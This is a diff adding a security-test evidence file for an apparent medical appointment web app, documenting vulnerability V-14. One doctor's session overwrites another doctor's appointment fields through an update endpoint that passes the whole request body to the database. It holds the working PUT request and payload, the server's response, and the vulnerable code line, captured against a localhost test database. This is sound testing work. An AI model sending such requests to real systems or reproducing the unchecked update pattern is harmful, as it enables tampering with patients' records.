@@ -1,0 +1,36 @@
+V-14 Any doctor can rewrite any field of any appointment
+========================================================
+
+state    : BEFORE the fix
+captured : 2026-09-24T17:41:47.965Z
+branch   : test/it22083500/v11-v15-before-evidence
+commit   : ec2853c
+tool     : Node.js v22.20.0 fetch() — requests sent by security-tests/capture-v11-v15.mjs
+           (the same attacks with the real curl binary: before-curl.txt in this folder)
+target   : http://localhost:4000  (disposable in-memory database, localhost only)
+
+------------------------------------------------------------------------------
+WHAT THIS PROVES
+  updateAppointmentStatus() passes the whole request body to findByIdAndUpdate().
+  Nothing limits it to the status field, and nothing checks that the appointment
+  belongs to the doctor making the request.
+
+METHOD: black box — a doctor edits another doctor's appointment, adding extra fields
+
+  caller      : alpha (Doctor, id 6ab560a539b92768520592c2)
+  appointment : 6ab560a539b92768520594bf  — patient Alice, booked with Dr Beta (id 6ab560a539b92768520592c5)
+  seeded values: patientFirstName "Alice", appointmentCharges "3000", city "Kandy",
+                 department "Oncology", status "Pending"
+
+> fetch PUT $BASE/api/v1/appointment/update/6ab560a539b92768520594bf [with alpha's session cookie]
+  body: {"status":"Accepted","appointmentCharges":"1","city":"HACKED","department":"HACKED-DEPT","patientFirstName":"Overwritten"}
+  HTTP 200
+  {"statusCode":200,"data":{"_id":"6ab560a539b92768520594bf","patient":"6ab560a439b92768520592b8","patientFirstName":"Overwritten","patientLastName":"Adams","doctor":"6ab560a539b92768520592c5","doctorFirstName":"Betty","doctorLastName":"Beta","experience":"10 years","appointmentCharges":"1","city":"HACKED","pincode":"20000","appointmentDate":"2026-11-01T00:00:00.000Z","department":"HACKED-DEPT","status":"Accepted","createdAt":"2026-09-24T17:40:53.644Z","updatedAt":"2026-09-24T17:41:47.952Z","__v":0},"message":"Appointment Status Updated!"}
+
+  RESULT: 5 of 5 submitted fields written: status, appointmentCharges, city, department, patientFirstName
+          on an appointment whose doctor is 6ab560a539b92768520592c5 (Dr Beta), by Dr Alpha.
+
+WHITE BOX
+  backend/src/controllers/appointment.controller.js:61:  appointment = await Appointment.findByIdAndUpdate(id, req.body, {
+
+  The function is named "update status", but req.body goes to the database whole.
